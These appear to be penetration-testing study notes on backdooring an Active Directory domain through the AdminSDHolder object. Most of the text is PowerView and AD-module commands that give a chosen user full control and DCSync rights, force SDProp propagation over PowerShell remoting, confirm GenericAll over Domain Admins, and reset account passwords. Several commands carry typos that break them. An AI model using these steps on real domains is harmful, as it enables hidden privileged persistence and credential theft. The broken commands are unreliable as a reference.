AdminSDHolder (Admin Security Descriptor Holder)
• It resides in the System container of a domain and used to controls the permission - using an ACL - for certain built-in privileged groups (called Protected Groups)
    • Protected Groups
        • Account Operators 
        • Backup Operators
        • Server Operators
        • Print Operators
        • Domain Admins
        • Replilcator
        • Enterprise Admins
        • Domain Controllers
        • Read-Only Domain Controllers
        • Schema Admins
        • Administrators

• Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of the protected groups and members with the ACL of AdminSDHolder and differences are overwritten on the object ACL.
• Attacker can get access to the Domain Admin group by adding attacker's account using the ACL on the Domain Admin.
• Modifying the ACL of the Admin SDHolder.

• Adding ACL on the Domain Admin group
   ◇ PowerView (Run as DA on DC)
      ▪ Add-ObjectACL -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName user_name -Rights All -Verbose
   ◇ Active Directory Module and Set-ADACL (Run as DA on DC)
      ▪ Import AD module and DLL
      ▪ Import Set-ADACL.ps1 
      ▪ Set-ADACL -DistinguishedName 'CN=AdminSDHolder, CN=System' -Principal user_name  -Verbose → This is provide full rights to the specified user
      ▪ Set-ADACL -DistinguishedName 'DC=Domain_Controller_FQDN_Name' -Principal user_name -GUIDRight DCSync -Verbose → This is to provide user with DCSync access to the specified user.


• Steps to run remotely using PS remoting and running SDPropogator PS1 script
   ◇ Run Invoke-SDPropgator.ps1 with DA rights
   ◇ $sess = New-PSSession -ComputerName Domain_Controller_FQDN_Name
   ◇ Invoke-Command -FilePath .\Invoke-SDPropogator.ps1 -Session $sess
   ◇ Enter-PSSession -Session $sess
   ◇ Invoke-SDPropogator -showProgress -timeoutMinutes 1 -Verbose

• Once the above scripts and command has been ran; check for Domain Admin permissions:
   ◇ Open PS session with Standard rights
   ◇ PowerView
      ▪ Get-ObjectACL -SamAccountName "Domain Admins" -ResolvedGUIDS | ?{$_.IdentityReference -match 'user_name'} → The specified user should get Generic ALL access which means user has all the access over the domain.
      ▪ OR
      ▪ Get-ObjectACL -SamAccountName "Domain Admins" -ResolvedGUIDS | select IdentityReference
   ◇ Active Directory Module
      ▪(Get-Acl -Path 'AD:\CN=Domain Admins, CN=Users,DC=Domain_Controller_FQDN_Name ').Access | ?{_.IdentityReference -match 'user_name'}
      ▪ OR
      ▪ Get-Acl -Path 'AD:\CN=Domain Admins, CN=Users,DC=Domain_Controller_FQDN_Name ').Access | select IdentityReference

• Aprart from adding users to AdminSDHolder group; there other PERMISSIONS can also be used for a user to the AdminSDHolder
   ◇ ResetPassword
      ▪ AD Module
         - Set-ADAccountPassword -Identity username -NewPassword (ConvertTo-SecurreString "Password@123" -AsPlainTest -Force) -Verbose
      ▪ PowerView Dev
         - Set-DomainUserPassword -Identity username -NewPassword (ConvertTo-SecurreString "Password@123" -AsPlainTest -Force) -Verbose
   ◇ WriteMembers
